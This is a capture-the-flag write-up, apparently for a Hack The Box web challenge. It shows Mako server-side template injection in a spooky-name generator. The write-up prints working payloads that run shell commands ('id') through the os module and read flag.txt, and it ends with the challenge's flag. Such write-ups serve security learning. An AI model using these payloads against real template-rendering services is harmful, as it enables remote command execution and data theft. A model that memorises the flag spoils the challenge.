
> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

&nbsp;

![1](https://github.com/user-attachments/assets/5064c874-6b90-485d-abe7-c820170d8855)

As we can see, the application modifies the name with different fonts.
Let's check the `Network` tab to see if there are any requests being made to any particular pages of server.


## SSTI

Since no validation is performed before sending user input to the Mako template engine's `render_template()` function, we can safely say that it is vulnerable to SSTI - Server Side Template Injection.

Let's provide the following input:

```
${9+9}
```

![2](https://github.com/user-attachments/assets/a00100bc-171c-4571-ae71-49d0236fe7a5)

We can access the `os` module and run arbitrary commands. Leveraging that, we can find our user.

```
${self.module.cache.util.os.popen('id').read()}
```

![3](https://github.com/user-attachments/assets/6ccc5105-a53e-4235-8600-1d9a771e6bf9)

We can now read the `flag.txt` file using a similar payload:

```
${self.module.cache.util.os.popen('cat ../flag.txt').read()}
```

![4](https://github.com/user-attachments/assets/44c793c6-52be-46eb-b976-b97055e59a32)

## Flag

```
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
```
